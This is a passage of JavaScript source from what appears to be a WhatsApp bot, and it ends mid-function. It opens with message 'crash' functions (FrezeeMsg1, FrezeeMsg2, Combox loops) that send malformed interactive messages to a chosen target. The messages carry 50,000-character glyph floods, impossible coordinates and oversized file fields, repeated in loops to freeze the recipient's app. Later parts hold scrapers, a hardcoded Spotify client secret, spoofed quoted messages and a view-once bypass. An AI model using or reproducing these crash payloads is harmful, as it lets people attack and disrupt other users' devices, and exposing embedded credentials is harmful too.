                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function FrezeeMsg2(target) {
            let virtex = "⿻🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟⿻";
            let memekz = Date.now();

            await TradzSigma.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "MOON KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵⿻";

            TradzSigma.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "DinzID Chx CRASH👻👻" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`))
}
async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`))
}
async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`))
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
TradzSigma.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await TradzSigma.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
TradzSigma.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};
async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/');
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';');
                const cookieKeyValue = cookieParts[0].trim();
                return cookieKeyValue;
            });
            return cookies.join('; ');
        } else {
            console.warn('No set-cookie headers found in the response.');
            return null;
        }
    } catch (error) {
        console.error('Error fetching cookies:', error);
        return null;
    }
}

async function pinterest(query) {
    try {
        const cookies = await getCookies();
        if (!cookies) {
            console.log('Failed to retrieve cookies. Exiting.');
            return;
        }

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';

        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                "options": {
                    "isPrefetch": false,
                    "query": query,
                    "scope": "pins",
                    "no_fetch_context_on_resource": false
                },
                "context": {}
            }),
            _: Date.now()
        };

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        };

        const { data } = await axios.get(url, {
            headers: headers,
            params: params
        })

        const container = [];
        const results = data.resource_response.data.results.filter((v) => v.images?.orig);
        results.forEach((result) => {
            container.push({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            });
        });

        return container;
    } catch (error) {
        console.log(error);
        return [];
    }
}
var ppuser
try {
ppuser = await TradzSigma.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
for (let BhosdikaXeon of VoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./library/data/assets/audio/${BhosdikaXeon}.mp3`)
TradzSigma.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StikerTradz){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./library/data/TradMedia/sticker/${BhosdikaXeon}.webp`)
TradzSigma.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of GambarTradz){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./library/data/TradMedia/image/${BhosdikaXeon}.jpg`)
TradzSigma.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoDinzID){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./library/data/TradMedia/video/${BhosdikaXeon}.mp4`)
TradzSigma.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
TradzSigma.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await TradzSigma.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}

//////////////
const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: namabot, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: namabot,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":namabot, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6283182739135-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":namabot, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6283182739135:6283182739135\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./library/data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await TradzSigma.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await TradzSigma.getName(i)}\nFN:${await TradzSigma.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${namabot}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await TradzSigma.readMessages([readkey]);
}

TradzSigma.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
TradzSigma.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
TradzSigma.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./library/scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await TradzSigma.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await TradzSigma.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./library/scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await TradzSigma.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await TradzSigma.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
const DinzIDchaty = `${budy}`
DinzIDai(pushname,DinzIDchaty)
}
if (m.isGroup && isAutoAiGc) {
const DinzIDchaty = `${budy}`
DinzIDai(pushname,DinzIDchaty)
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}
if (!m.key.fromMe && m.isGroup && TradzIsChat) {
const DinzIDchaty = `${budy}`
DinzIDai(pushname,DinzIDchaty)
}
//=================================================================
if (!m.isGroup && !TradID && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await TradzSigma.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
TradzSigma.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}
////////////////////////////////////////////////////////////////////////////////////////

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

function hitungmundur(tanggal, bulan, tahun) {
            let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
            let now = Date.now();
            let distance = from - now;
            let days = Math.floor(distance / (1000 * 60 * 60 * 24));
            let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            let seconds = Math.floor((distance % (1000 * 60)) / 1000);
            return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit '
        }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
